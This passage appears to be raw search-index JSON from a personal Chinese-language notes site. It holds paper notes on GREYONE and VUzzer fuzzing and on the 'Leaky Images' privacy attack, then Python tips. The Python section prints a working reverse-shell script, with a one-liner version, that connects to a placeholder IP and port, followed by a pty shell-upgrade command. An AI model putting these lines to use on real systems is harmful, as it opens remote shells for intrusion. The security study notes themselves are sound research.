\u5b9e\u9a8c\u5728\u6700\u65b0\u7684\u8f6f\u4ef6\u4e0a\u8dd1 \u53d1\u73b0\u4e86105\u4e2a\u65b0\u7684bugs\uff0c\u62ff\u5230\u4e8641\u4e2aCVE RQ1: \u600e\u4e48\u505a\u8f7b\u91cf\u51c6\u786e\u7684\u6c61\u70b9\u5206\u6790 FTI\u53d8\u5f02\u8f93\u5165\u6bcf\u4e2a\u5b57\u8282\u770b\u53d8\u91cf\u503c\u7684\u53d8\u5316 \u8f7b\u91cf \u6ca1\u6709over-taint \u7f13\u89e3under-taint(\u53d8\u5f02\u4e0d\u5b8c\u6574\u4f1a\u6709) \u8fd0\u884c\u65f6\u975e\u5e38\u5feb RQ2: \u6709\u4e86taint\u600e\u4e48\u6709\u6548\u6307\u5bfc\u53d8\u5f02 \u9009\u62e9\u5565\u8def\u5f84 \u9009\u62e9\u54ea\u4e9b\u5b57\u8282 \u4f18\u5148\u9009\u62e9\u80fd\u5f71\u54cd\u66f4\u591a\u672a\u5230\u8fbe\u5206\u652f\u7684\u5b57\u8282\uff0c\u4f18\u5148\u4f9d\u8d56\u66f4\u591a\u4f18\u5148\u5b57\u8282\u7684\u5206\u652f RQ3: \u5982\u4f55\u4f7f\u7528\u6570\u636e\u6d41\u7279\u5f81(\u6c61\u70b9\u5c5e\u6027\u548c\u7ea6\u675f\u7b26\u5408\u6027)\u4f18\u5316\u8fdb\u5316\u65b9\u5411conformance-guided evolution \u4f18\u5148\u66f4\u9ad8\u7b26\u5408\u6027\u7684seeds \u80fd\u907f\u514dAngora\u7684\u9677\u5165\u5c40\u90e8\u6700\u4f18\u7684\u95ee\u9898\uff0c\u53e6\u5916\u5c06\u6b63\u5728\u6267\u884c\u7684\u53d8\u5f02rebase\u5230\u66f4\u597d\u7684seeds\u53ef\u4ee5\u663e\u8457\u4f18\u5316\u901f\u5ea6 \u7b26\u53f7\u6267\u884c\u4e0d\u80fd\u5904\u7406\u5927\u7a0b\u5e8f\uff0c\u4e0d\u80fd\u89e3\u51b3\u590d\u6742\u7684\u7ea6\u675f\u5982on-way functions \u4f20\u7edf\u7684\u52a8\u6001\u6c61\u70b9\u5206\u6790 \u9700\u8981\u5927\u91cf\u52b3\u52a8\u4eba\u7c7b\u5de5\u4f5c, \u4e0d\u51c6\u786e undertaint\u7684\u95ee\u9898 \u4e0d\u80fd\u5904\u7406\u9690\u5f0f\u6570\u636e\u6d41\uff0c\u975e\u5e38\u6162 \u4e0d\u7b26\u5408non-intererence rule[16]\u7684\u5c31\u6709\u4f9d\u8d56\u5173\u7cfb FTI\u53d8\u5f02\u7684\u65f6\u5019\u662f\u4f7f\u7528\u9884\u5148\u5b9a\u4e49\u7684\u53d8\u5f02\u89c4\u5219 \u5982\u5355\u4f4d\u7ffb\u8f6c\u3001\u591a\u4f4d\u7ffb\u8f6c\u548c\u7b97\u672f\u64cd\u4f5c\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u5b8c\u5168\u53d8\u5f02 \u53d8\u91cf\u503c\u8ffd\u8e2a\u662f\u63d2\u4ee3\u7801 special value tracking code \u53ea\u5173\u6ce8\u4e0e\u8def\u5f84\u7ea6\u675f\u6709\u5173\u7684\u53d8\u91cf\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u51fa\u503c\u548c\u5bf9\u5e94\u7684\u8f93\u5165\u5b57\u8282\u6bd4\u8f83 \u4e00\u81f4\u5c31\u662fdirect copy \u8f93\u5165\u5b57\u8282\u7684\u6743\u91cd\u662f\u5b83\u5f71\u54cd\u7684\u672a\u5230\u8fbe\u7684\u5206\u652f\u6570\u91cf\uff0c\u4e00\u4e2a\u672a\u5230\u8fbe\u5206\u652f\u7684\u6743\u91cd\u662f\u5b83\u4f9d\u8d56\u7684\u6240\u6709\u5b57\u8282\u6743\u91cd\u7684\u548c \u53d8\u5f02\u54ea\u4e2a\u4f4d\u7f6e\uff1f\u627e\u5f53\u524dseed\u672a\u8986\u76d6\u7684\u9644\u8fd1\u7684\u5206\u652f \u6309\u5206\u652f\u6743\u91cd\u5012\u5e8f\uff1b\u5bf9\u4e8e\u4e00\u4e2a\u5206\u652f\u4f9d\u8d56\u7684\u591a\u4e2a\u5b57\u8282\uff0c\u6309\u5b57\u8282\u7684\u6743\u91cd\u5012\u5e8f \u600e\u4e48\u53d8\u5f02\uff1fdirect copy\u5982\u679c\u9700\u8981\u8ddf\u4e00\u4e2a\u8fd0\u884c\u65f6\u7b97\u51fa\u7684checksum\u76f8\u7b49 \u5148\u5f97\u5230\u8fd0\u884c\u65f6\u9700\u8981\u7684\u503c\uff0c\u518d\u4f7f\u7528\u8fd9\u4e2a\u503c\u548c\u5fae\u5c0f\u53d8\u5f02\u6765\u4fee\u590d\u5bf9\u5e94\u7684\u8f93\u5165\u5b57\u8282 \u53ef\u4ee5\u76f4\u63a5\u77e5\u9053\u5e94\u8be5\u4fee\u6539\u54ea\u4e2aoffset \u9700\u8981\u4ec0\u4e48\u503c indirect copies\u5c31\u968f\u673a\u53d8\u5f02 \u53ef\u4ee5\u4e00\u6b21\u53d8\u5f02\u591a\u4e2a\u5b57\u8282 \u7f13\u89e3undertaint \u9664\u4e86\u4f9d\u8d56\u7684\u5b57\u8282 \u4e5f\u4ee5\u4e00\u4e2a\u8f83\u4f4e\u7684\u6982\u7387\u53d8\u5f02\u90bb\u5c45\u5b57\u8282 \u8ba1\u7b97\u7b26\u5408\u6027 \u5bf9\u4e8e\u672a\u5230\u8fbe\u7684\u5206\u652f \u5b9a\u4e49\u662f\u4e24\u4e2a\u6bd4\u8f83\u7684\u503c\u4e4b\u95f4\u6709\u591a\u5c11bit\u4e00\u81f4\uff0c \u5bf9\u4e8e\u4e00\u4e2a\u5df2\u7ecf\u5230\u8fbe\u57fa\u672c\u5757 \u5b9a\u4e49\u662f\u5176\u6240\u6709\u672a\u5230\u8fbe\u90bb\u5c45\u7684\u7b26\u5408\u6027\u7684\u6700\u5927\u503c\uff0c \u5bf9\u4e8e\u4e00\u4e2aseed \u5b9a\u4e49\u662f\u8986\u76d6\u7684\u6240\u6709\u57fa\u672c\u5757\u7684\u7b26\u5408\u6027\u7684\u7d2f\u52a0 seed queue\u65b0\u7684\u7ed3\u6784 \u5728\u76f8\u540ccoverage \u53d1\u73b0\u66f4\u9ad8\u5206\u6570\u7684seed\u7684\u65f6\u5019 \u66ff\u6362\uff1b\u5728\u53d1\u73b0\u76f8\u540ccoverage \u76f8\u540c\u5206\u6570 \u4f46\u57fa\u672c\u5757conformance\u7684\u5206\u5e03\u4e0d\u540c\u7684\u65f6\u5019\uff0c\u52a0\u5165\u7684\u8fd9\u4e2aNode\u6570\u7ec4 \u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0e\u68af\u5ea6\u4e0b\u964d\u76f8\u5f53\uff0c\u8fd8\u80fd\u907f\u514dAngora\u7684\u9677\u5165\u5c40\u90e8\u6700\u4f18\u7684\u95ee\u9898 \u5728\u66ff\u6362seed\u540e \u540e\u7eed\u5bf9\u8fd9\u4e2aseed\u7684\u4f7f\u7528\u4e5f\u7acb\u523b\u6362\u6210\u65b0\u7684seed \u8fd9\u6837\u53ef\u4ee5\u5728LAVA\u6570\u636e\u96c6\u4e0a\u5feb3\u500d \u9009seed\u7684\u65f6\u5019 \u7ed9\u9ad8\u5206\u6570\u7684\u66f4\u9ad8\u6743\u91cd selective testing \u76f8\u6bd4AFL\u7684coverage tracking\u591a\u4e86\u4e24\u4e2a\u6a21\u5f0f\uff1aFTI\u53d8\u91cf\u503c\u76d1\u6d4b\uff0c\u8fdb\u5316\u4f18\u5316\u7b97conformance\u5206\u6570 \u5f53conformance\u4e00\u6bb5\u65f6\u95f4\u4e0d\u589e\u52a0\u4e86\u5c31\u5207\u56deAFL\u7684\u6a21\u5f0f \u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6 conformance\u8ba1\u7b97\u7528\u7684by operations like __builtin_popcount FTI\u7528\u5230\u7684\u503c\u76d1\u6d4b \u7528\u7684bitmap\u7684\u7ed3\u679c \u7ed9\u6bcf\u4e2a\u53d8\u91cf\u4e00\u4e2a\u5168\u5c40\u552f\u4e00\u7684ID LAVA-M\u9664\u4e86who\u4e5f\u6709unlisted bugs? \u66f4\u6df1\u5165\u7684\u5206\u6790\uff1a FTI\u7684under taint\u95ee\u9898 FTI\u6709\u6ca1\u6709\u7528\uff1f \u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8eDTA\u7684\u955c\u50cf\u6bd4\u8f83 \u5404\u4e2a\u4e0d\u540c\u90e8\u5206\u5bf9\u7ed3\u679c\u7684\u8d21\u732e \u53bb\u6389\u4f18\u5148\u7b56\u7565\uff0c\u53bb\u6389conformance\u8fdb\u5316 \u4e09\u8005\u6bd4\u8f83 selective fuzzing \u6bd4\u8f83\u6267\u884c\u901f\u5ea6 \u5176\u4ed6Paper: DigFuzz[45] \u7528\u4e86\u7b26\u53f7\u6267\u884c \u6982\u7387\u8def\u5f84\u4f18\u5148\u6a21\u578b TaintInduce[46]\u53ef\u4ee5\u81ea\u52a8\u63a8\u6d4b\u51fapropagation rules ProFuzzer[42]\u4e5f\u662f\u4e00\u6b21\u53d8\u5f02\u4e00\u4e2a\u5b57\u8282 \u4f46\u53ea\u5173\u6ce8coverage\u53d8\u5316 \u4e0d\u80fd\u63a8\u65ad\u51fa\u6c61\u70b9\u7684\u4f9d\u8d56\u5173\u7cfb \u548cFairFuzz[24]\u90fd\u80fd\u63a8\u65adpartial type of mutated bytes \u4f46\u5bf9\u8fd9\u4e2a\u5206\u652f\u662f\u5426\u5df2\u7ecf\u5230\u8fc7\u662finsensitive\u7684 MutaFlow[26] \u76d1\u6d4bsink APIs\u7684\u53d8\u5316 \u53c2\u6570\u662f\u5426\u88abtainted REDQUEEN[4] \u80fd\u5904\u7406direct copy\u4f46\u4e0d\u80fd\u627e\u5230\u7cbe\u786e\u7684\u4f4d\u7f6e \u9700\u8981\u767e\u6b21\u8fd0\u884c\u6765\u83b7\u5f97a colorized version with higher entropy \u518d\u6d4b\u4e00\u904d\u83b7\u5f97\u4f4d\u7f6e \u6574\u4e2a\u8fc7\u7a0b\u592a\u6162 Intel-laf[1] \u5c06\u957f\u7684\u6bd4\u8f83\u5206\u5272\u6210\u77ed\u7684\u6bd4\u8f83 \u4f46\u662f\u5e26\u6765\u66f4\u591a\u8bed\u4e49\u76f8\u540c\u7684\u8def\u5f84 \u4e0d\u80fd\u5904\u7406\u975e\u5e38\u91cf\u6bd4\u8f83 SYMFUZZ[8] \u53ef\u4ee5\u68c0\u6d4binput bits\u4e4b\u95f4\u7684\u4f9d\u8d56 \u8ba1\u7b97\u51faoptimal mutation ratio","title":"GREYONE: Data Flow Sensitive Fuzzing"},{"location":"PaperReading/#vuzzer","text":"https://github.com/vusec/vuzzer/blob/f6f7d593a0e76e86afb3c7af6d5186f897bab979/operators.py#L291 \u8fd9\u91cc\u6211\u4eec\u5206\u6790\u4e00\u4e0bvuzzer\u5b9e\u73b0\u7684\u53d8\u5f02\u64cd\u4f5c\uff0c\u5176\u6240\u6709operators\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u51fd\u6570 \u540c\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\uff0c\u6392\u5e8f\u540e\u5982\u4e0b\u6240\u793a\uff0c\u6211\u6309\u7167\u6211\u7684\u7406\u89e3\u6807\u6ce8\u4e86\u529f\u80fd\uff1a add_random \u9009\u62e9\u4e00\u4e2a\u968f\u673a\u4f4d\u7f6e \u63d2\u5165\u968f\u673a\u5b57\u7b26\u4e32 add_random add_random change_bytes \u6839\u636eTAINTMAP\u4fee\u6539 change_bytes change_random \u9009\u62e9\u4e00\u90e8\u5206\u5b57\u8282\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32 change_random change_random_full \u9009\u62e9\u4e00\u90e8\u5206\u5b57\u8282\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\u6216\u4ece\u7a0b\u5e8f\u4e2d\u63d0\u53d6\u51fa\u7684magic bytes change_random_full double_fuzz \u968f\u673a\u9009\u62e9\u4e24\u79cdmutator eliminate_double_null \u5220\u53bb\\0\\0 eliminate_null \u5c06\\0\u66ff\u6362\u4e3aA eliminate_random \u968f\u673a\u5220\u53bb\u4e00\u90e8\u5206 eliminate_random int_slide \u5c06\u7279\u5b9a\u4f4d\u7f6e\u53d8\u4e3a \\xFF\\xFF\\xFF\\xFF \u6216 \\x80\\x00\\x00\\x00 \u6216 \\x00\\x00\\x00\\x00 lower_single_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u5176-1 raise_single_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u5176+1 single_change_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u968f\u673a\u5b57\u7b26 totally_random \u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u5728100~1000\u7684\u5b57\u7b26\u4e32","title":"VUzzer\u7684\u53d8\u5f02\u64cd\u4f5c"},{"location":"PaperReading/#leaky-images-targeted-privacy-attacks-in-the-web","text":"Usenix19 PDF \u653b\u51fb\u8005\u53ef\u4ee5\u77e5\u9053\u7528\u6237\u5728google,onedrive,dropbox\u7684\u767b\u5f55\u8eab\u4efd\uff0c\u901a\u8fc7\u7279\u5b9a\u5206\u4eab\u4e00\u4e2a\u56fe\u7247\u770b\u80fd\u5426\u6210\u529f\u52a0\u8f7d \u5728intro\u91cc\u5c31\u7ed9\u51fa\u4e00\u4e2a\u5438\u5f15\u4eba\u7684\u4f8b\u5b50\uff1a\u7528\u6765\u53bb\u533f\u540d\u5316\u5ba1\u7a3f\u4eba\u2014\u2014\u6536\u96c6\u6240\u6709committe\u7684\u90ae\u7bb1\u5206\u4eab\u56fe\u7247\uff0c\u8bba\u6587\u4e2d\u7ed9\u4e2a\u653b\u51fb\u8005\u7f51\u7ad9\u7684\u94fe\u63a5 \u8868\u683c1\u6bd4\u8f83\u76f8\u5173\u7684\u653b\u51fb\uff1a\u8ffd\u8e2a\u50cf\u7d20\u3001\u793e\u4ea4\u5a92\u4f53\u6307\u7eb9\uff08\u662f\u5426\u767b\u5f55\uff09\u3001CSRF\uff08\u6709\u526f\u4f5c\u7528\uff09\u3001\u672c\u6587Leaky images \u6bd4\u8f83\uff1a\u8c01\u80fd\u653b\u51fb\uff1f \u653b\u51fb\u8005\u80fd\u5b9e\u73b0\u5565\uff1f \u7528\u9014\u573a\u666f \u6240\u6709\u7f51\u7ad9\u90fd\u80fd\u53d1\u8d77\u653b\u51fb\uff0c\u53ef\u4ee5\u51c6\u786e\u627e\u51fa\u53d7\u5bb3\u8005\uff0c\u5b9a\u5411\u7684fine-grained\u53bb\u533f\u540d\u5316 \u7814\u7a76\u4e86250\u4e2a\u6700\u6d41\u884c\u7f51\u7ad9\u768430\u4e2a \u627e\u52308\u4e2a\u7f51\u7ad9\u6709\u6f0f\u6d1e \u624b\u5de5\u627e \u5171\u4eab\u7684\u56fe\u7247\u80fd\u901a\u8fc7\u4e00\u4e2alink\u52a0\u8f7d \u4e14\u53ea\u6709\u7279\u5b9a\u7528\u6237\u80fd\u8bbf\u95ee\uff08\u57fa\u4e8ecookie\u7684\u8bbf\u95ee\u63a7\u5236\uff09 \u8d21\u732e\uff1a \u65b0\u7684\u653b\u51fb \u5b9a\u5411\u9690\u79c1\u653b\u51fb\u6ee5\u7528\u56fe\u7247\u5171\u4eab\u670d\u52a1\u6765\u786e\u5b9a\u53d7\u5bb3\u8005\u662f\u5426\u6b63\u5728\u8bbf\u95ee\u653b\u51fb\u8005\u7684\u7f51\u7ad9 \u8ba8\u8bba\u4e86\u653b\u51fb\u7684\u5404\u4e2a\u53d8\u79cd \u53ef\u4ee5\u653b\u51fbaim at\u5355\u4e2a\u7528\u6237 \u4e00\u7fa4\u7528\u6237 \u4e0d\u540c\u670d\u52a1\u4e4b\u95f4link\u7528\u6237 \u4ee5\u53ca\u4e0d\u9700\u8981js\u7684 \u5c55\u793a8\u4e2a\u6d41\u884c\u7f51\u7ad9\u5b58\u5728\u95ee\u9898 \u8ba9\u7b2c\u4e09\u65b9\u7f51\u7ad9\u80fd\u5b9a\u4f4d\u4ed6\u4eec\u7684\u7528\u6237 \u63d0\u51fa\u591a\u79cd\u7f13\u89e3\u95ee\u9898\u7684\u65b9\u6848\u5e76\u8ba8\u8bba\u4f18\u7f3a\u70b9 Table2 shows a two-dimensional matrix \u6839\u636e\u662f\u5426\u9274\u6743+URL\u662f\u516c\u5f00\u3001\u4e0d\u540c\u7528\u6237\u76f8\u540c\u3001\u4e0d\u540c\u7528\u6237\u4e0d\u540c\u6765\u533a\u5206\uff0c\u53ea\u6709\u9700\u8981\u9274\u6743+\u516c\u5f00url \u548c \u9700\u8981\u9274\u6743+url\u5bf9\u653b\u51fb\u8005\u53ef\u77e5 \u624d\u80fd\u505aLeaky image\u653b\u51fb \u8ba8\u8bba\u90e8\u5206\uff1a\u5728\u65b9\u6cd5\u4e00\u8282\u4e2d\u5c31\u8ba8\u8bbarelated work\uff0c\u6bd4\u8f83\u8ffd\u8e2a\u50cf\u7d20\u3001\u6307\u7eb9\u3001\u5b9a\u5411\u653b\u51fbvs\u5927\u89c4\u6a21\u8ffd\u8e2a\u3002\u5b9a\u5411\u653b\u51fb\u636e\u8bf4\u5bf9\u9ad8\u4ef7\u503c\u53d7\u5bb3\u8005\u8d8a\u6765\u8d8a\u6d41\u884c[37] \u73b0\u5b9emeasurement\u7684\u8ba8\u8bba Our study of \u2026 in real-world sites enables several observations. Leaky images\u662f\u666e\u904d\u7684 prevalent \u53d7\u5bb3\u8005\u751a\u81f3\u4e0d\u4f1a\u6ce8\u610f\u5230\u88ab\u5171\u4eab\u4e86\u4e00\u4e2a\u56fe\u7247 \u53d7\u5bb3\u8005\u4e0d\u80fdunshare \u56fe\u7247\u5171\u4eab\u670d\u52a1\u4f7f\u7528\u4e86\u591a\u79cd\u5b9e\u73b0\u7b56\u7565\u7684\u6df7\u5408 use a diverse mix of implementation strategies \u4e0d\u540c\u7f51\u7ad9\u653b\u51fb\u9762\u4e0d\u540c varies from site to site \u8868\u8fbe\uff1a \u4ec5\u4ec5\u9700\u8981 involve nothing more than \u2026 \u8bc1\u660e\u73b0\u5b9e\u5b58\u5728\u80fd\u5f71\u54cd\u4eca\u5929\u6700\u6d41\u884c\u7f51\u7ad9 Section 4 shows that these cases occur in practice, and that they affect some of today\u2019s most popular websites. \u4e3a\u4e86\u7406\u89e3\u6700\u6d41\u884c\u7f51\u7ad9\u53d7\u5f71\u54cd\u7684\u7a0b\u5ea6 To understand to what extent popular websites are affected by the privacy problem discussed in this paper \u7b2c\u4e00\u4e14\u6700\u91cd\u8981\u7684The first and perhaps most important observation is that \u2026 \u5e0c\u671b\u80fd\u4fc3\u8fdb\u4ee5\u540e\u66f4\u81ea\u52a8\u5316\u7684\u7814\u7a76 We hope that our results will spur future work on more automated analyses that identify leaky images \u8ba8\u8bba\u6bcf\u4e2a\u89e3\u51b3\u65b9\u6848\u4e0d\u8db3 The drawback of this fix is that \u2026 On the downside, implementing this defense may \u2026 However, this mitigation cannot defend against \u2026 require the developers to be aware of the vulnerability in the first place. \u4e8b\u5148\u5c31\u77e5\u9053\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5b58\u5728 \u548cGDPR\u5f88\u642d\uff0c\u8981\u6c42\u8bbe\u8ba1\u4e0a\u9ed8\u8ba4\u4fdd\u62a4 would be in the spirit of the newly adopted European Union\u2019s Genearl Data Protection Regulation which requires data protection by design and by default. \u9700\u8981\u66f4\u591a\u7814\u7a76\u6765\u6df1\u5165\u5206\u6790\u53ef\u7528\u6027+\u517c\u5bb9\u6027+\u90e8\u7f72\u5f00\u9500\uff0cto aid the browser vendors to take an informed decision, future work should perform an in-depth analysis of all these defenses in terms of usability, compatibility and deployment cost, in the style of \u2026 [9], and possibly propose additional solutions. \u8865\u5145\u4e86\u4e00\u79cd\u65b0\u7684\u653b\u51fbLeaky images adds a privacy-related attack to the set of existing targeted attacks. \u5382\u5546\u4fee\u590d\u8bf4\u660e\u95ee\u9898\u5f88\u91cd\u8981 This feedback shows that the problem we identified is important to practitioners. \u6211\u4eec\u7684\u8bba\u6587\u5e2e\u52a9\u63d0\u9ad8\u5f00\u53d1\u8005\u548c\u7814\u7a76\u8005\u7684\u610f\u8bc6\u4ee5\u540e\u907f\u514d\u8fd9\u4e2a\u95ee\u9898 Our paper helps raising awareness among developers and researchers to avoid this privacy issue in the future. \u6280\u672f\uff1a \u4e0d\u7528onload\u4e5f\u53ef\u4ee5\u53bb\u68c0\u67e5\u5df2\u7ecf\u52a0\u8f7d\u7684\u56fe\u7247\u7684\u5bbd\u9ad8 \u7528 \u5d4c\u5957\u52a0\u8f7d \u5728\u5916\u9762\u7684\u5931\u8d25\u5c31\u4f1a\u52a0\u8f7d\u91cc\u9762\u7684\uff0c\u8fd9\u4e2a\u65b9\u6848\u4e0d\u9700\u8981js \u56fe\u7247\u5206\u4eab\u670d\u52a1\u80fd\u5206\u4eab\u7ed9\u4e00\u6279\u7528\u6237\uff0c\u628a\u6bcf\u4e2a\u53d7\u5bb3\u8005\u7f16\u7801\u6210bit vector\uff0c\u6bcf\u4e2abit\u5173\u8054\u4e00\u4e2a\u56fe encode each victim with a bit vector and to associate each bit with one shared image \u8fd9\u4e2a\u653b\u51fb\u5047\u8bbe\u4e86\u7528\u6237\u5df2\u7ecf\u5728\u6d4f\u89c8\u5668\u767b\u5f55\uff0cSkype\u5927\u90e8\u5206\u7528\u6237\u90fd\u662f\u901a\u8fc7\u7535\u8111\u624b\u673a\u7684client\uff0c\u6240\u4ee5\u8fd9\u4e2a\u653b\u51fb\u7684\u5f71\u54cd\u6709\u9650 hence the impact of this attack is limited to the web users \u6839\u672c\u539f\u56e0 js\u548c\u56fe\u7247\u90fd\u4e0d\u53d7\u540c\u6e90\u7b56\u7565\u5f71\u54cd \u7f13\u89e3\u63aa\u65bd\uff1a \u670d\u52a1\u7aef\uff1a\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u8981\u6c42\u5f00\u53d1\u8005\u9996\u5148\u5c31\u610f\u8bc6\u5230\u8fd9\u79cd\u653b\u51fb\u7684\u5b58\u5728 \u7981\u7528\u57fa\u4e8ecookie\u7684\u9274\u6743\uff0c\u4e0d\u540c\u7528\u6237url\u4e0d\u540c \u4e0d\u8db3\uff1a\u94fe\u63a5\u7684\u79c1\u5bc6\u6027\u53ef\u4ee5\u88abcomrpmised\u5982\u4e0d\u5b89\u5168\u7684\u901a\u9053\uff0c\u6d4f\u89c8\u5668\u7684\u4fa7\u4fe1\u9053\u6216\u8005\u76f4\u63a5\u8ba9\u7528\u6237\u4ee5\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u5904\u7406\u94fe\u63a5 \u66f4\u4e25\u683c\u7684cookie\u9274\u6743\uff0c\u4e0d\u540c\u7528\u6237url\u4e0d\u540c \u4e0d\u8db3\uff1a\u5b9e\u73b0\u53ef\u80fd\u56f0\u96be\u8981\u7ef4\u62a4\u7528\u6237\u548curl\u7684\u6620\u5c04\uff0c\u800c\u4e14\u589e\u52a0\u4e86\u65b0\u7684\u8bbf\u95ee\u63a7\u5236\u6027\u80fd\u635f\u8017 \u7528CSRF\u7684\u65b9\u5f0f \u68c0\u67e5origin\u5934 \u4e0d\u8db3\uff1a\u4e0d\u80fd\u9632\u5fa1\u4fe1\u4efb\u57df\u7684\u653b\u51fb Facebook\u4e4b\u524d\u90fd\u5141\u8bb8\u7528\u6237\u8bbe\u7f6ehtml\u4ee3\u7801 \u6d4f\u89c8\u5668\uff1a \u9ed8\u8ba4\u4e0d\u4f7f\u7528cookie\u52a0\u8f7d\u7b2c\u4e09\u65b9\u56fe\u7247 \u53ea\u6709\u5f53\u6d4f\u89c8\u5668\u786e\u5b9a\u9274\u6743\u4e0e\u5426\u4e0d\u5f71\u54cd\u52a0\u8f7d\u56fe\u7247\u7684\u5185\u5bb9 \u6269\u5c55\u5c31\u662f\u9ed8\u8ba4\u7981\u6b62 \u7528csp\u6269\u5c55\u6765\u5141\u8bb8\u53cc\u91cd\u52a0\u8f7d \u7c7b\u4f3c\u4e8eShareMeNot[32] \u5b9e\u73b0\u9ed8\u8ba4\u963b\u6b62\u7b2c\u4e09\u65b9\u56fe\u7247\u8bf7\u6c42 \u9664\u975e\u7528\u6237\u663e\u5f0f\u540c\u610f \u6d4f\u89c8\u5668\u505ainformation flow control \u4fdd\u8bc1\u56fe\u7247\u662f\u5426\u52a0\u8f7d\u6210\u529f\u7684\u4fe1\u606f\u4e0d\u53d1\u7ed9\u670d\u52a1\u5668 \u4f46\u8fd9\u4e2a\u4fa7\u4fe1\u9053\u592a\u591a \u9ad8\u7ea7\u7528\u6237\uff1a \u56fe\u7247\u5171\u4eab\u670d\u52a1\u5546\u5e94\u8be5\u63d0\u4f9b\u7528\u6237\u66f4\u591a\u63a7\u5236\uff0c\u4f8b\u5982\u5e94\u8be5\u51b3\u5b9a\u8c01\u6709\u6743\u9650\u5171\u4eab\u7ed9\u4ed6\uff0c\u4ee5\u53ca\u5f53\u524d\u88ab\u5171\u4eab\u7684\u5217\u8868 \u4f46\u5927\u90e8\u5206\u7528\u6237\u4e0d\u5173\u5fc3while the majority of the users are unlikely to take advantage of such fine-grained controls.","title":"Leaky Images: Targeted Privacy Attacks in the Web"},{"location":"Python/","text":"Python \u00b6 \u55ef\u54fc\uff0cPython\u5f88\u597d\u73a9\u5462\u2026\u6709\u4eba\u8bf4Python\u662f\u80fd\u8fd0\u884c\u7684\u4f2a\u4ee3\u7801\uff0c\u5c31\u5199\u4ee3\u7801\u7684\u901f\u5ea6\u800c\u8a00\u662f\u663e\u8457\u4f18\u4e8eC\u7684\uff0c\u4e5f\u6709\u5f88\u591a\u597d\u7528\u7684\u7c7b\u5e93\u5462\uff0c\u53cd\u6b63\u5f3a\u70c8\u63a8\u8350\u8fd9\u95e8\u8bed\u8a00\u5566~ \u5f53\u4f60\u5c1d\u8bd5\u4e00\u4e2a\u5305\u7684\u65f6\u5019\uff0c\u6ce8\u610f\u81ea\u5df1\u7684py\u6587\u4ef6\u540d\u79f0\u4e0d\u80fd\u4e0e\u5305\u540d\u91cd\u540d\uff0c\u4f8b\u5982\u4e0d\u8981\u51fa\u73b0flask.py \u5b89\u88c5pip \u00b6 curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py \u8bbe\u7f6epip\u6e90 - mirrors.aliyun.com \u00b6 \u5982\u679c\u53ea\u9700\u8981\u4e00\u6b21\u6027\u5b89\u88c5\u4e2a\u5305\uff08\u5982Dockerfile\uff09\uff1a pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com \u5728Linux\u670d\u52a1\u5668\u4e0a\u5b89\u88c5python\u7684\u5305\u65f6\uff0c\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u5c06pip\u6e90\u6539\u4e3a\u56fd\u5185\u7684\u963f\u91cc\u955c\u50cf\uff08\u8c46\u74e3\u6e90\u4f3c\u4e4e\u4e0d\u518d\u66f4\u65b0\uff09\uff0c\u80fd\u663e\u8457\u63d0\u9ad8\u5305\u7684\u4e0b\u8f7d\u901f\u5ea6 mkdir -p ~/.pip echo \"\"\" [global] index-url = http://mirrors.aliyun.com/pypi/simple/ [install] trusted-host=mirrors.aliyun.com \"\"\" >~/.pip/pip.conf \u81f3\u4e8eWindows\u7528\u6237\uff0c\u5728\u7528\u6237\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2apip\u76ee\u5f55\uff0c\u5982\uff1aC:\\Users\\chenyuan\\pip\uff0c\u65b0\u5efa\u6587\u4ef6pip.ini\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a [global] index-url = http://mirrors.aliyun.com/pypi/simple/ [install] trusted-host = mirrors.aliyun.com \u53cd\u5f39shell \u00b6 \u9996\u5148\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u7528 nc -l \u7aef\u53e3 import socket , subprocess , os s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( \"IP\u5730\u5740\" , \u7aef\u53e3 )) os . dup2 ( s . fileno (), 0 ) os . dup2 ( s . fileno (), 1 ) os . dup2 ( s . fileno (), 2 ) p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]) \u5355\u884c\u7248\u672c\uff1a IP = \"x.x.x.x\" ; PORT = 6666 ; import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( IP , PORT )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]) \u83b7\u5f97\u4e00\u4e2atty \u00b6 python - c 'import pty; pty.spawn(\"/bin/sh\")' \u8ba9requests\u4f7f\u7528\u591a\u4e2aIP \u00b6 requests\u5305\u5e76\u6ca1\u6709\u4f7f\u7528socket.create_connection\u51fd\u6570\uff0c\u6240\u4ee5\u66ff\u6362socket.create_connection\u5e76\u4e0d\u591f def function_hook_parameter ( oldfunc , parameter_index , parameter_name , parameter_value ): 